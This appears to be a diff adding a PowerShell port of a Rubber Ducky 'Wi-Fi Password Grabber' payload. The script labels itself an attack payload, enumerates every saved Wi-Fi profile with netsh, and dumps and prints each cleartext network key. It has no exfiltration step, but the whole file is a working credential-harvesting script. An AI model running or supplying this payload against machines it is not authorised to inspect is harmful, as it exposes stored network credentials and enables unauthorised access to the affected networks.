@@ -1,0 +1,46 @@
+# Wi-Fi Password Grabber Script in PowerShell
+# @title: WiFi Windows Password Grabber
+# @author: Silvian Dragan (adapted for PowerShell)
+# @version: 1.0
+# @target: Windows 7 and above
+
+# Define LED simulation functions for color output
+function Set-LED {
+    param ($Color)
+    switch ($Color) {
+        "Purple" { Write-Host "[*] Starting Attack Payload..." -ForegroundColor Magenta }
+        "Green" { Write-Host "[+] Successful Execution." -ForegroundColor Green }
+        "Red" { Write-Host "[-] Failed to Load Ducky Script Dependency." -ForegroundColor Red }
+        default { Write-Host "[?] Unknown Status." -ForegroundColor Yellow }
+    }
+}
+
+# Start the attack mode simulation
+Set-LED "Purple"
+
+# Get saved Wi-Fi profiles
+$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+    ($_ -split ":")[1].Trim()
+}
+
+if ($wifiProfiles.Count -eq 0) {
+    Set-LED "Red"
+    Write-Output "No Wi-Fi profiles found on this device."
+    exit 1
+}
+
+# Retrieve and display Wi-Fi passwords
+foreach ($profile in $wifiProfiles) {
+    $profileInfo = netsh wlan show profile name="$profile" key=clear
+    $passwordLine = $profileInfo | Select-String "Key Content"
+
+    if ($passwordLine) {
+        $password = ($passwordLine -split ":")[1].Trim()
+        Write-Host "Wi-Fi Profile: $profile | Password: $password" -ForegroundColor Green
+    } else {
+        Write-Host "Wi-Fi Profile: $profile | Password: Not found" -ForegroundColor Yellow
+    }
+}
+
+# Indicate successful completion
+Set-LED "Green"
